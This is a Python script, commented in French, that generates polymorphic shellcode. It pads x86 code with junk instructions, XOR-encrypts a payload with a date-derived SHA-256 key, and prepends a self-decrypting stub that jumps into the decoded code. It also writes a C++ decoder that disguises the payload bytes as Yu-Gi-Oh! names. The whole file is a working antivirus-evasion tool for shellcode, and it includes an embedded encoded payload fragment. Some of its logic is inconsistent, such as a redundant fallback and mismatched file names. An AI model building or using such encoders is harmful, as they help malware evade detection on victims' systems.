import random
import hashlib
from datetime import datetime

JUNK_INSTRUCTIONS = [
    [0x51, 0x59],                # push ecx; pop ecx
    [0x52, 0x5A],                # push edx; pop edx
    [0x53, 0x5B],                # push ebx; pop ebx
    [0x89, 0xf6],                # mov esi, esi
    [0x31, 0xc0],                # xor eax, eax
]


YUGIOH_CHARACTERS = [
    "Yugi", "Kaiba", "Joey", "Tea", "Tristan", "Bakura", "Marik", "Ishizu",
    "Odion", "Mai", "Weevil", "Rex", "Mako", "Bandit Keith", "Pegasus", "Mokuba",
    "Duke", "Serenity", "Roland", "Arkana", "Strings", "Rare Hunter", "Lumis", "Umbra",
    "Yami Yugi", "Yami Bakura", "Yami Marik", "Solomon", "Arthur", "Rebecca",
    "Leon", "Zigfried", "Alister", "Raphael", "Valon", "Dartz", "Gurimo", "Johnson",
    "Crump", "Leichter", "Nesbitt", "Big Five", "Noah", "Gozaburo", "Priest Seto", "Pharaoh Atem",
    "Mana", "Mahad", "Isis", "Karim", "Shada", "Akhenaden", "Diabound", "Zorc",
    "Blue Eyes", "Dark Magician", "Red Eyes", "Exodia", "Slifer", "Obelisk", "Ra", "Kuriboh",
    "Celtic Guardian", "Mystical Elf", "Feral Imp", "Winged Dragon", "Summoned Skull", "Beaver Warrior", "Gaia Knight", "Curse of Dragon",
    "Time Wizard", "Baby Dragon", "Thousand Dragon", "Flame Swordsman", "Elemental Hero", "Neo Spacian", "Crystal Beast", "Ancient Gear",
    "Cyber Dragon", "Vehicroid", "Ojama", "Destiny Hero", "Evil Hero", "Vision Hero", "Masked Hero", "Contrast Hero",
    "Elemental Lord", "Gem Knight", "Constellar", "Evilswarm", "Madolche", "Spellbook", "Prophecy", "Fire Fist",
    "Mermail", "Atlantean", "Harpie", "Amazoness", "Toon", "Archfiend", "Fiend", "Zombie",
    "Plant", "Insect", "Beast", "Winged Beast", "Dragon", "Spellcaster", "Warrior", "Machine",
    "Thunder", "Aqua", "Pyro", "Rock", "Dinosaur", "Reptile", "Fish", "Sea Serpent",
    "Psychic", "Divine Beast", "Wyrm", "Cyberse", "Fairy", "Demon", "Angel", "Spirit",
    "Ritual", "Fusion", "Synchro", "Xyz", "Pendulum", "Link", "Normal", "Effect",
    "Spell", "Trap", "Quick Play", "Continuous", "Equip", "Field", "Counter", "Flip",
    "Gemini", "Union", "Tuner", "Spirit Monster", "Toon Monster", "Ritual Monster", "Fusion Monster", "Synchro Monster",
    "Xyz Monster", "Pendulum Monster", "Link Monster", "Token", "Extra Deck", "Side Deck", "Main Deck", "Graveyard",
    "Banished", "Face Down", "Face Up", "Attack Position", "Defense Position", "Direct Attack", "Piercing Damage", "Trample",
    "Burn Damage", "Mill", "Draw", "Search", "Special Summon", "Tribute", "Sacrifice", "Destroy",
    "Negate", "Counter", "Target", "Select", "Activate", "Chain", "Priority", "Timing",
    "Phase", "Turn", "End Phase", "Main Phase", "Battle Phase", "Standby Phase", "Draw Phase", "Damage Step",
    "Life Points", "ATK", "DEF", "Level", "Rank", "Scale", "Link Rating", "Attribute",
    "LIGHT", "DARK", "FIRE", "WATER", "EARTH", "WIND", "DIVINE", "Duel Monsters",
    "Shadow Realm", "Millennium", "Puzzle", "Rod", "Eye", "Scale", "Key", "Ring",
    "Necklace", "Tauk", "Items", "Pharaoh", "Ancient Egypt", "Memory World", "Virtual World", "Duel Academy",
    "Industrial Illusions", "KaibaCorp", "Duelist Kingdom", "Battle City", "Grand Championship", "Waking Dragons", "Dawn of Duel", "Ceremonial Battle",
    "Heart of Cards", "Believe in Deck", "Destiny Draw", "Millennium Puzzle", "Shadow Game", "Mind Crush", "Soul Prison", "Penalty Game",
    "Duel", "Victory", "Defeat", "Champion", "King of Games", "Duelist", "Tournament", "Championship",
    "Monster", "Magic", "Polymerization", "Mirror Force", "Mystical Space Typhoon", "Pot of Greed", "Graceful Charity", "Change of Heart",
    "Raigeki", "Dark Hole", "Monster Reborn", "Premature Burial", "Call of Haunted", "Torrential Tribute", "Bottomless Trap", "Solemn Judgment",
    "Blue Eyes White Dragon", "Red Eyes Black Dragon", "Dark Magician Girl", "Black Luster Soldier", "Jinzo", "Buster Blader", "Cyber End Dragon", "Rainbow Dragon"
]

def insert_junk_instructions(stub: list[int], count: int = 3) -> list[int]:
    for _ in range(count):
        junk = random.choice(JUNK_INSTRUCTIONS)
        pos = random.randint(0, len(stub))
        stub = stub[:pos] + junk + stub[pos:]
    return stub

def junk_addition_via_negation():
    return insert_junk_instructions([0x8b, 0xc3, 0xf7, 0xd1, 0x29, 0xc1])

def junk_addition_double_negation():
    return insert_junk_instructions([0x8b, 0xd8, 0xf7, 0xd3, 0xf7, 0xd1, 0x01, 0xcb, 0xf7, 0xdb])

def junk_xor_substitution():
    return insert_junk_instructions([0x33, 0xc0, 0xf7, 0xd0, 0x23, 0xd8, 0xf7, 0xd3, 0x23, 0xc3, 0x09, 0xd8])

def junk_rand_add_chain():
    r = random.randint(1, 255)
    return insert_junk_instructions([0xb8, r, 0x00, 0x00, 0x00, 0x8b, 0xd8, 0x03, 0xc3, 0x03, 0xc1, 0x2b, 0xc3])

def junk_math_sub():
    return insert_junk_instructions([0x89, 0xC8, 0xF7, 0xD8, 0x01, 0xD8])

def junk_xor():
    return insert_junk_instructions([0x89, 0xC8, 0x21, 0xD0, 0x89, 0xD9, 0x31, 0xD3, 0x09, 0xD8])

def build_junk_math_block() -> list[int]:
    blocks = [junk_addition_via_negation, junk_addition_double_negation, junk_xor_substitution, junk_rand_add_chain, junk_math_sub, junk_xor]
    selected_blocks = random.sample(blocks, k=random.randint(2, 4))
    result = []
    for block in selected_blocks:
        result += block()
    return result

def calculate_raw_key() -> int:
    today = datetime.today()
    return ((today.month + today.day) * today.year) & 0xFF

def derive_sha256_hash(raw_key: int) -> bytes:
    key_bytes = raw_key.to_bytes(2, byteorder='big')
    return hashlib.sha256(key_bytes).digest()

def xor_encode_full_hash(shellcode: list[int], hash_bytes: bytes) -> list[int]:
    return [b ^ hash_bytes[i % 32] for i, b in enumerate(shellcode)]

def generate_decoder_stub_with_integrated_key(shell_len: int, key_hash: bytes) -> list[int]:
    """Génère un stub de décodage avec la clé SHA-256 intégrée"""
    
    key_size = 32
    jmp_size = 2
    
    stub = []
    
    decoder_offset = key_size + 2  
    stub.extend([0xeb, decoder_offset])  #r
    
    stub.extend(list(key_hash))
    

    decoder_start_pos = len(stub)
    
    decoder = [
        # Obtenir l'adresse de base via call/pop
        0xe8, 0x00, 0x00, 0x00, 0x00, # call next_instruction
        0x5e,                         # pop esi (adresse courante)
        
        # Calculer l'adresse de la clé (esi - decoder_size - key_size)
        0x83, 0xee, key_size + 5,     # sub esi, (key_size + call_instruction_size)
        0x89, 0xf7,                   # mov edi, esi (edi = adresse de la clé)
        
        # Calculer l'adresse du shellcode encodé (après ce décodeur)
        0x83, 0xc6, len(stub) + 30,   # add esi, decoder_total_size (approximation)
        
        # Initialiser les compteurs
        0x31, 0xc9,                   # xor ecx, ecx
        0xb1, shell_len & 0xFF,       # mov cl, <shellcode_len>
        0x31, 0xd2,                   # xor edx, edx (compteur pour la clé)
        
        # Boucle de décodage
        0x8a, 0x06,                   # mov al, [esi] (byte du shellcode)
        0x8a, 0x1c, 0x17,             # mov bl, [edi+edx] (byte de la clé)
        0x30, 0xd8,                   # xor al, bl (déchiffrement)
        0x88, 0x06,                   # mov [esi], al (sauvegarde)
        0x46,                         # inc esi (prochain byte du shellcode)
        0x42,                         # inc edx (prochain byte de la clé)
        0x83, 0xfa, 0x20,             # cmp edx, 32 (taille de la clé SHA-256)
        0x75, 0x02,                   # jne skip_reset
        0x31, 0xd2,                   # xor edx, edx (reset du compteur de clé)
        # skip_reset:
        0xe2, 0xee,                   # loop decode_loop
        
        # Recalculer l'adresse du début du shellcode déchiffré
        0x83, 0xee, shell_len,        # sub esi, shell_len (retour au début)
        0xff, 0xe6,                   # jmp esi (exécution du shellcode)
    ]
    
    actual_decoder_size = len(decoder)
    decoder[12] = (len(stub) + actual_decoder_size) & 0xFF  # Corriger l'offset
    
    stub.extend(decoder)
    
    for i, byte_val in enumerate(stub):
        if byte_val < 0 or byte_val > 255:
            print(f"[!] Valeur invalide à la position {i}: {byte_val}")
            stub[i] = abs(byte_val) & 0xFF
    
    return stub

def generate_simple_yugioh_decoder(shellcode: list[int]) -> str:
    """Génère un décodeur Yu-Gi-Oh! simplifié avec juste la fonction de décodage et un main"""
    unique_bytes = sorted(set(shellcode))
    
    if len(unique_bytes) > len(YUGIOH_CHARACTERS):
        raise ValueError(f"Trop de bytes uniques ({len(unique_bytes)}) pour les personnages Yu-Gi-Oh! disponibles ({len(YUGIOH_CHARACTERS)})")
    
    byte_to_yugioh = {byte_val: YUGIOH_CHARACTERS[i] for i, byte_val in enumerate(unique_bytes)}
    
    cpp_map_entries = ',\n    '.join(f'{{"{char}", 0x{b:02x}}}' for b, char in byte_to_yugioh.items())
    
    encoded_shellcode_array = ',\n    '.join(f'"{byte_to_yugioh[b]}"' for b in shellcode)
    
    cpp_code = f'''#include <map>
#include <vector>
#include <string>
#include <iostream>
#include <iomanip>
#include <cstdint>

using namespace std;

map<string, uint8_t> yugioh_to_byte = {{
    {cpp_map_entries}
}};

vector<string> encoded_shellcode = {{
    {encoded_shellcode_array}
}};

vector<uint8_t> decode_yugioh_shellcode(const vector<string>& yugioh_encoded) {{
    vector<uint8_t> decoded;
    
    for (const auto& character : yugioh_encoded) {{
        auto it = yugioh_to_byte.find(character);
        if (it != yugioh_to_byte.end()) {{
            decoded.push_back(it->second);
        }} else {{
            cerr << "Personnage Yu-Gi-Oh! inconnu: " << character << endl;
            return {{}};
        }}
    }}
    
    return decoded;
}}

int main() {{

    
    vector<uint8_t> decoded_shellcode = decode_yugioh_shellcode(encoded_shellcode);
    
    if (decoded_shellcode.empty()) {{
        cerr << "Échec du décodage!" << endl;
        return 1;
    }}
    
    cout << "Decodage reussi! Shellcode avec cle integree:" << endl;
    cout << "unsigned char shellcode[] = \\"";
    
    for (size_t i = 0; i < decoded_shellcode.size(); ++i) {{
        if (i % 16 == 0 && i != 0) {{
            cout << "\\"" << endl << "\\"";
        }}
        cout << "\\\\x" << hex << setw(2) << setfill('0') << (int)decoded_shellcode[i];
    }}
    
    cout << "\\";" << endl;
    cout << "// Taille: " << dec << decoded_shellcode.size() << " bytes" << endl;
    
    return 0;
}}'''
    
    return cpp_code

def generate_simple_decoder_with_key(shell_len: int, key_hash: bytes) -> list[int]:
    """Version simplifiée du décodeur avec clé intégrée - plus fiable"""
    
    # [clé] + [décodeur] + [shellcode]
    stub = []
    
    stub.extend(list(key_hash))
    
    # 2. Décodeur simple utilisant des offsets fixes
    decoder = [
        # Obtenir l'adresse de base
        0xe8, 0x00, 0x00, 0x00, 0x00, # call $+5
        0x5e,                         # pop esi (esi = adresse courante)
        
        # esi pointe maintenant après call, calculer adresse de la clé
        0x83, 0xee, 0x25,             # sub esi, 37 (5 bytes call + 32 bytes clé)
        0x89, 0xf7,                   # mov edi, esi (edi = adresse clé)
        
        # Calculer adresse du shellcode (après ce décodeur)
        0x83, 0xc6, 0x30,             # add esi, 48 (taille approximative du décodeur)
        
        # Initialisation
        0x31, 0xc9,                   # xor ecx, ecx
        0xb1, shell_len & 0xFF,       # mov cl, shell_len
        0x31, 0xd2,                   # xor edx, edx
        
        # Boucle de décodage
        0x8a, 0x06,                   # mov al, [esi]
        0x8a, 0x1c, 0x17,             # mov bl, [edi+edx]
        0x30, 0xd8,                   # xor al, bl
        0x88, 0x06,                   # mov [esi], al
        0x46,                         # inc esi
        0x42,                         # inc edx
        0x83, 0xfa, 0x20,             # cmp edx, 32
        0x75, 0x02,                   # jne +2
        0x31, 0xd2,                   # xor edx, edx
        0xe2, 0xee,                   # loop
        
        # Retour au début du shellcode et exécution
        0x83, 0xee, shell_len & 0xFF, # sub esi, shell_len
        0xff, 0xe6,                   # jmp esi
    ]
    
    decoder_size = len(decoder)
    decoder[12] = (32 + decoder_size) & 0xFF  
    
    stub.extend(decoder)
    
    return stub

def generate_polymorphic_shellcode_with_integrated_key(original_shellcode: bytes) -> tuple[list[int], bytes]:
    """Génère un shellcode polymorphe avec la clé intégrée dans le stub"""
    raw_key = calculate_raw_key()
    hash_bytes = derive_sha256_hash(raw_key)
    print(f"[+] Raw key: 0x{raw_key:02x}")
    print(f"[+] SHA-256: {hash_bytes.hex()}")

    shellcode_list = list(original_shellcode)
    encoded_shellcode = xor_encode_full_hash(shellcode_list, hash_bytes)
    
    try:
        stub = generate_simple_decoder_with_key(len(original_shellcode), hash_bytes)
    except:
        print("[!] Erreur avec le décodeur complexe, utilisation du décodeur simple")
        stub = generate_simple_decoder_with_key(len(original_shellcode), hash_bytes)
    
    final_shellcode = stub + encoded_shellcode
    for i, byte_val in enumerate(final_shellcode):
        if not (0 <= byte_val <= 255):
            print(f"[!] Correction byte {i}: {byte_val} -> {byte_val & 0xFF}")
            final_shellcode[i] = byte_val & 0xFF
    
    return final_shellcode, hash_bytes

original_shellcode = (
    b"\xdb\xc3\xd9\x74\x24\xf4\xbd\x69\x7c\xa7\x39\x5f\x2b"
    b"\xc9\xb1\x31\x31\x6f\x18\x03\x6f\x18\x83\xc7\x5b\x6b"
    b"\x44\x4b\x8b\xe9\xa7\xb4\x4b\x8e\x2e\x51\x7a\x8e\x55"
)

if __name__ == "__main__":
    print("🃏 Générateur de Shellcode avec Clé SHA-256 Intégrée 🃏")
    print("=" * 60)
    
    polymorphic_shellcode, key_bytes = generate_polymorphic_shellcode_with_integrated_key(original_shellcode)
    print("[+] Shellcode polymorphe avec clé intégrée généré")

    with open("polymorphic_shellcode_integrated.bin", "wb") as f:
        f.write(bytearray(polymorphic_shellcode))
    print("[+] Shellcode avec clé intégrée écrit dans 'polymorphic_shellcode_integrated.bin'")

    with open("integrated_key.txt", "w") as f:
        f.write(f"Raw key: 0x{calculate_raw_key():02x}\n")
        f.write(f"SHA-256: {key_bytes.hex()}\n")
        f.write(f"Key position: bytes 2-33 dans le shellcode\n")
    print("[+] Informations de clé écrites dans 'integrated_key.txt'")

    try:
        cpp_code = generate_simple_yugioh_decoder(polymorphic_shellcode)
        
        with open("yugioh_decoder.cpp", "w", encoding="utf-8") as f:
            f.write(cpp_code)
        print("[+] Décodeur Yu-Gi-Oh! avec clé intégrée écrit dans 'yugioh_decodercpp'")
        
        print(f"\n[+] Statistiques:")
        print(f"    - Bytes uniques dans le shellcode: {len(set(polymorphic_shellcode))}")
        print(f"    - Taille du shellcode final: {len(polymorphic_shellcode)} bytes")
        print(f"    - Position de la clé: bytes 2-33 (après le JMP initial)")
        print(f"    - Taille originale: {len(original_shellcode)} bytes")
        print(f"    - Overhead du décodeur: {len(polymorphic_shellcode) - len(original_shellcode)} bytes")
        
    except ValueError as e:
        print(f"Erreur : {e}")
        exit(1)

    print("\n🎯 Fichiers générés avec succès!")
    print("   - polymorphic_shellcode_integrated.bin : Shellcode avec clé intégrée")
    print("   - integrated_key.txt : Informations sur la clé intégrée")
    print("   - yugioh_decoder_integrated.cpp : Décodeur C++ avec clé intégrée")
    print("\n✨ La clé SHA-256 est maintenant intégrée directement dans le shellcode! ✨")
    print("🔑 Plus besoin de fichier externe - tout est autonome!")
